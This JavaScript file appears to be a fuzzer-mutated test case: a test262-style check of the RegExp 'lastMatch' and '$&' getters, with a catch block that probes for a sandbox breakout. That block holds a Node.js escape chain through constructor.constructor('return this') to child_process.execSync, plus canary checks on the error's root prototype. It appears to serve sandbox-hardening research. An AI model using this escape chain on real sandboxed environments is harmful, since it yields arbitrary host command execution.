try {
    [
        'lastMatch',
        '$&'
    ].forEach(function (property) {
        let REPLACER = 23;
        const desc = Object.getOwnPropertyDescriptor(RegExp, property);
        assert.sameValue(typeof desc.get, 'function', property + ' getter');
        assert.throws(TypeError, function () {
            let REPLACER = 23;
            desc.get();
        }, 'RegExp.' + property + ' getter throws for property descriptor receiver');
        assert.throws(TypeError, function () {
            let REPLACER = 23;
            desc.get.call(/ /);
        }, 'RegExp.' + property + ' getter throws for RegExp instance receiver');
        assert.throws(TypeError, function () {
            throw () => {
                return () => {
                };
            };
            desc.get.call(RegExp.prototype);
        }, 'RegExp.' + property + ' getter throws for %RegExp.prototype% receiver');
        [
            undefined,
            null,
            {},
            true,
            false,
            0,
            1,
            'string'
        ].forEach(function (value) {
            assert.throws(TypeError, function () {
                desc.get.call(value);
            }, 'RegExp.' + property + ' getter throws for primitive "' + value + '" receiver');
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}